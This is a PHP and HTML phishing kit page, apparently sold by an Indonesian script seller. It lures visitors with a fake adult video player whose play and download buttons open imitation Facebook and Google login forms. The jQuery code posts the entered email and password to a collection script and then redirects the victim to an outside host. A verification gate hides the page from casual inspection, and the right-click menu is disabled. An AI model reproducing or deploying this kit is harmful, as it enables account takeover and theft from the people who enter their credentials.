<?php
// CREATOR KANG SCRIPT
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/62891630150

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html><html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="google" content="notranslate">
<title>- <?php echo $data['nama'];?> - Billy n izi - DoodStream - PoopHD</title>
<meta name="robots" content="nofollow, noindex">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/all.css"> 
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/16/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/16/tamp.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/16/style.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/16/embed2.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/16/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/16/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/16/favicon-16x16.png">
<meta name="msapplication-TileColor" content="#fe6081">
<meta name="theme-color" content="#333333">
<style>.video-link {aspect-ratio:16/9;display:block;width:100%;overflow:visible;position:relative;background-color:#000;cursor:pointer}.video-link .thumbnail{width:100%;height:100%;object-fit:contain;object-position:center}.video-link::after{content:"";display:block;position:absolute;top:0;left:0;height:100%;width:100%;background-image:url("https://cdn.jsdelivr.net/gh/cdn-alz/img@main/16/play.svg");background-position:center center;background-repeat:no-repeat;background-size:80px;filter:drop-shadow(0 0 10px rgba(0, 0, 0, .4))}.video-link:hover::after{background-size:100px;-webkit-transition:background-size .2s ease-in-out;-moz-transition:background-size .2s ease-in-out;-o-transition:background-size .2s ease-in-out;transition:background-size .2s ease-in-out}
        #poopiframe {
         width: 100%;
         height: 100%;
         border: none;
         margin-bottom: -3%;
        }
    </style>
</head>
<body style="padding-top:30px">
<div onclick="codxLoginPopup()" id="player" class="player-wrap container mt-4">
<div style="aspect-ratio: 16/9;" id="os_player">
<div onclick="codxLoginPopup()" class="video-link">
<img onclick="codxLoginPopup()" class="thumbnail" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/16/kdvwm05ush0by79k.jpg">
</div>
</div>
</div>
<div class="container">
<div class="title-wrap">
<div class="d-flex flex-wrap align-items-center justify-content-between">
<div class="info">
<h4> - <?php echo $data['nama'];?> - Billy n izi - DoodStream - PoopHD </h4>
<div class="d-flex flex-wrap align-items-center text-muted font-weight-bold">
<div class="length"> <i class="fad fa-clock mr-1"></i> 00:07:53 </div> <span class="mx-2"></span>
<div class="size"> <i class="fad fa-save mr-1"></i> 26.8 MB </div> <span class="mx-2"></span>
<div class="uploadate"> <i class="fad fa-calendar-alt mr-1"></i> <script type="text/javascript">
                      var d = new Date();
                      d.setDate(d.getDate() - 10);
                      document.write(d.toLocaleDateString(navigator.language || navigator.userLanguage, {
                        month: 'long',
                        day: 'numeric',
                        year: 'numeric'
                      }));
                    </script> </div>
</div>
</div>
</div>
</div>
</div>
<div class="container mt-4">
<div class="video-content text-center">
<div class="download-content" style="display: block;">
<label class="label-playlist d-block"> Download video </label> <a onclick="codxLoginPopup()" class="btn btn-primary d-flex align-items-center justify-content-between">
<span onclick="codxLoginPopup()"> Download </span> <i onclick="codxLoginPopup()" class="fad fa-cloud-download"></i> </a>
</div>
</div>
</div> <div class="container mt-4">
<div class="video-content text-center">
<div class="ref_container">
<strong> Share </strong>
<div class="cool_btn mt-2">
<span class="ref_url"><?= $_SERVER['SERVER_NAME'] ?></span><span class="ref_url_btn"><i class="fad fa-copy mr-1"></i></span>
<div class="ref_url_copied2">Copied!</div>
</div>
<div class="download-content" style="display: block;">
<button class="sharenet mt-4 btn btn-secondary d-flex align-items-center justify-content-between visible-sm-block" target="_blank">
<span> Share </span> <i class="fad fa-share"></i> </button>
</div>
</div>
</div>
</div>
<script type="text/javascript">
        document.addEventListener('contextmenu', event => event.preventDefault());
        $(document). bind("contextmenu", function(e) { return false; }); 
        $(document).on("click",".cool_btn",function(){var e=$("<input>");$("body").append(e),e.val($(".ref_url").text()).select(),document.execCommand("copy"),e.remove(),$(".ref_url_copied2").addClass("oi"),setTimeout(function(){$(".ref_url_copied2").removeClass("oi")},2e3)});const shareData={title:"- <?php echo $data['nama'];?> - Billy n izi - DoodStream - PoopHD",text:"tonton ini - <?php echo $data['nama'];?> - Billy n izi - DoodStream - PoopHD !",url:"<?= $_SERVER['SERVER_NAME'] ?>"},btn=document.querySelector("button"),resultPara=document.querySelector(".result");btn.addEventListener("click",async()=>{try{await navigator.share(shareData),resultPara.textContent="- <?php echo $data['nama'];?> - Billy n izi - DoodStream - PoopHD"}catch(e){console.log("oi")}});
    </script>
    <html>
    <body>
      <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div style="color:#000;" class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/loggp.webp" onclick="$('.alex-google').fadeIn();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" onsubmit="VerificationData();" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" onsubmit="VerificationData();" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.alex-hosting.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.alex-hosting.my.id/npm/jquery-1.16.min.js"></script>
  <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.alex-hosting.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
    <?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
    </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>